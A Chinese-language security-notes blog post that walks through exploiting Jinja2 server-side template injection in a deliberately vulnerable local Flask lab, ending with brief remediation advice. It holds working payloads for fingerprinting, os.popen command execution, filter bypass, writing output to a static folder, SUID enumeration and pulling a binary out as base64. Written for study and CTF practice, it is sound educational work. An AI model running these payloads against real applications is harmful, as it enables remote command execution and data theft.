---
title: "SSTI 服务器模板注入"
slug: "ssti-template-injection"
date: 2026-08-29T19:09:32+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "从模板语法探测到命令执行，记录 SSTI 的常见利用路径。"
summary: "从模板语法探测到命令执行，记录 SSTI 的常见利用路径。"
tags: ["SSTI", "模板注入", "RCE"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 8
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/13.SSTI(服务器模板注入).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ssti-template-injection/workflow.svg" alt="用户输入进入模板引擎后，通过表达式求值逐步获得对象方法和命令执行能力。" loading="lazy">
  <figcaption>图 1 · SSTI 模板注入链。用户输入进入模板引擎后，通过表达式求值逐步获得对象方法和命令执行能力。</figcaption>
</figure>

## 1. 本地 Jinja2 环境

```bash
mkdir -p /tmp/ssti-lab/static
cd /tmp/ssti-lab
python3 -m venv .venv
. .venv/bin/activate
pip install flask
```

创建 `app.py`：

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.get("/")
def index():
    name = request.args.get("name", "guest")
    return render_template_string("welcome " + name)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080, debug=True)
```

启动：

```bash
python3 app.py
```

## 2. 指纹

```bash
curl -sS --get --data-urlencode 'name={{7*7}}' \
  'http://127.0.0.1:8080/'
```

预期：

```text
welcome 49
```

再确认配置对象：

```bash
curl -sS --get --data-urlencode 'name={{config}}' \
  'http://127.0.0.1:8080/'
```

## 3. 命令执行

```bash
curl -sS --get \
  --data-urlencode "name={{lipsum.__globals__['os'].popen('id').read()}}" \
  'http://127.0.0.1:8080/'
```

经典可用链：

```jinja2
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

## 4. 过滤器绕过

如果字符串拼接被过滤，可以拆开关键字：

```jinja2
{% print(lipsum['__glo''bals__']['os']['popen']('id').read()) %}
```

如果 `{{ }}` 被限制但 `{% %}` 可用，用 `print` 输出结果。

## 5. 无回显时写入静态目录

目标存在可写 `static/`：

```bash
curl -sS --get \
  --data-urlencode "name={{lipsum.__globals__['os'].popen('id > static/out.txt').read()}}" \
  'http://127.0.0.1:8080/'
```

读取：

```bash
curl -sS 'http://127.0.0.1:8080/static/out.txt'
```

SUID 枚举：

```bash
curl -sS --get \
  --data-urlencode "name={{lipsum.__globals__['os'].popen('find / -perm -4000 -type f 2>/dev/null > static/suid.txt').read()}}" \
  'http://127.0.0.1:8080/'
curl -sS 'http://127.0.0.1:8080/static/suid.txt'
```

## 6. 二进制下载

```bash
curl -sS --get \
  --data-urlencode "name={{lipsum.__globals__['os'].popen('base64 /usr/bin/rev > static/rev.b64').read()}}" \
  'http://127.0.0.1:8080/'
curl -sS 'http://127.0.0.1:8080/static/rev.b64' -o rev.b64
base64 -d rev.b64 > rev
chmod +x rev
```

然后用 IDA/Ghidra 分析二进制里的特殊参数，再通过同一个 SSTI 执行：

```bash
curl -sS --get \
  --data-urlencode "name={{lipsum.__globals__['os'].popen('/usr/bin/rev --HDdss cat /flag').read()}}" \
  'http://127.0.0.1:8080/'
```

`--HDdss` 必须来自实际逆向结果，不能照抄示例。

## 7. 排错

| 现象 | 原因 |
| --- | --- |
| `{{7*7}}` 原样显示 | 输入没有进入模板 |
| 返回 500 | 链在当前 Jinja 版本不可用 |
| 无命令回显 | `popen` 被禁或输出被吞 |
| static 写入失败 | 目录不存在或不可写 |

## 8. 修复

- 不把用户输入拼进模板；
- 使用 `render_template` 和参数；
- 禁用 Jinja 未使用扩展；
- 沙箱环境限制对象属性；
- Web 用户最小权限，禁用 SUID。
